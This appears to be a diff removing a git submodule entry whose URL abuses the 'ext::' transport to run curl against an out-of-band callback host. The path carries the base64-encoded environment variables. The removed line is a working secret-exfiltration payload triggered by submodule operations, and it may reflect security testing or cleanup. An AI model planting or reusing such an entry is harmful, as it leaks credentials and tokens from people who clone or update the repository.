@@ -1,3 +1,0 @@
-[submodule "payload"]
-    path = payload  
-    url = "ext::sh -c curl% https://submodule.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(env|base64|head% -c% 200)% >&2% ;"
